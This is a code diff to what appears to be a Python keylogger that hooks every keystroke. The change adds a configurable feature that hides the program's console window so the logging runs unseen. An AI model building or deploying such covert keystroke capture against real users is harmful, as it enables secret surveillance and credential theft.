@@ -1,6 +1,8 @@
 import keyboard
 import win32api
 import win32event
+import win32console
+import win32gui
 import winerror
 import json
 import os
@@ -145,6 +147,12 @@ def pause_logging():
     line_buffer = line_buffer.removesuffix("P")
     paused = not paused
 
+def hide():
+    # Hide Console
+    window = win32console.GetConsoleWindow()
+    win32gui.ShowWindow(window, 0)
+    return True
+
 def main():
     print(LOGGER_NAME + " started")
     keyboard.hook(key_callback)
@@ -160,6 +168,10 @@ def main():
     exit()
 
 if __name__ == '__main__':
+    # Hide comand prompt
+    if config["hide"]:
+        hide()
+
     # Debug mode Write single characters 
     if config["mode"] == 'debug':
         CHAR_LIMIT = 1
